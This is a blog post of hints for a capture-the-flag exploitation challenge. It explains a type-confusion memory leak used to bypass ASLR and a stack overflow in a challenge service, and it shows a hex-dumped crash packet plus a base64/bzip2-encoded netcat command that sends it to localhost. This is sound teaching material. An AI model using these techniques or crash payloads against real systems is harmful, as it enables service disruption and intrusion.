---
title: 'Part 3: Hints'
author: ron
categories:
- hints
layout: post
date: '2023-01-10T11:02:16-08:00'
permalink: "/part3-hints"
featured: true
---

These are hints for the third challenge. Use at your own discretion!

<!--more-->

## Vulnerability types

You actually need to find two vulnerabilities:

1. Memory leak (to bypass ASLR)
2. Stack overflow (to execute code)

## Memory leak

There is a memory leak due to type confusion.

If you send a string where the service expects an integer, what happens? Is
there somewhere that displays the integer value back (like, say, in an error
message)?

That would be a great place to store strings (like an argument to `popen`)!

## Stack overflow

Do you see any dangerous functions being used in `apply`? Like, say, `strcat`
or similar?

### DoS Message

Here's a packet that will crash `apply`:

```
0000009B  00 00 00 02 6a f5 00 d9  00 00 04 25 00 00 00 06   ....j... ...%....
000000AB  00 00 00 01 00 00 12 34  00 00 00 02 00 00 43 21   .......4 ......C!
000000BB  00 00 00 02 00 00 43 21  00 00 00 02 00 00 43 21   ......C! ......C!
000000CB  00 00 00 02 00 00 43 21  00 00 00 02 00 00 43 21   ......C! ......C!
000000DB  00 00 00 00 00 00 00 66  41 41 41 41 41 41 41 41   .......f AAAAAAAA
000000EB  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
000000FB  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000010B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000011B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000012B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000013B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000014B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000015B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000016B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000017B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000018B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
0000019B  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41   AAAAAAAA AAAAAAAA
000001AB  00 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   .BBBBBBB BBBBBBBB
000001BB  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
000001CB  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
000001DB  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
000001EB  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
000001FB  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
0000020B  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
0000021B  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
0000022B  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
0000023B  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
0000024B  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
0000025B  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42   BBBBBBBB BBBBBBBB
0000026B  42 42 42 42 42 42 42 42  42 00 43 43 43 43 43 43   BBBBBBBB B.CCCCCC
0000027B  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
0000028B  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
0000029B  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
000002AB  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
000002BB  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
000002CB  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
000002DB  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
000002EB  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
000002FB  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
0000030B  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
0000031B  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
0000032B  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43   CCCCCCCC CCCCCCCC
0000033B  43 43 00 44 44 44 44 44  44 44 44 44 44 44 44 44   CC.DDDDD DDDDDDDD
0000034B  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
0000035B  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
0000036B  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
0000037B  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
0000038B  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
0000039B  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
000003AB  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
000003BB  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
000003CB  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
000003DB  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
000003EB  44 44 44 44 44 44 44 44  44 44 44 44 44 44 44 44   DDDDDDDD DDDDDDDD
000003FB  44 44 44 44 44 44 44 44  44 44 44 00 45 45 45 45   DDDDDDDD DDD.EEEE
0000040B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000041B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000042B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000043B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000044B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000045B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000046B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000047B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000048B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
0000049B  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
000004AB  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
000004BB  45 45 45 45 45 45 45 45  45 45 45 45 45 45 45 45   EEEEEEEE EEEEEEEE
000004CB  45 45 45 45 00                                     EEEE.
```

### Full DoS PoC

Here's how you can crash it with Netcat.. this is long, so I'm using bzip2
and base64 to encode it:

```
$ echo -ne 'QlpoOTFBWSZTWUzPK1AAAAt9p/0AECEiAn/iPgAnFEAoAAksAAAgAAICACAAdBkkDUekP1RpptGpiB6ho9BkoBM0TCYAJgBo0oYHSi4PiqvwbAR0H6vlkEBaRFBAShAKkJQ+MKoAROmZPK/C8f4DqYDEwKCM7I5va7YGupr7NG1ffgs8lABYU9FInCx6I/QfNLfsqZOVVVZS1F3JFOFCQTM8rUA=' | base64 -d | bunzip2 | nc -v localhost 1337
```

This is obviously somewhat spoilery, so use at your own descretion!

## Encryption

The response to `OPCODE_APPLY` basically encrypts your application send sends
it back. You need to figure out the encryption type and key! You should be
able to find calls to `EVP_EncryptInit_ex`, then work backwards from there.

## Doing something useful

The stack is overflowed with *encrypted* data. That means you need to *decrypt*
your payload first!
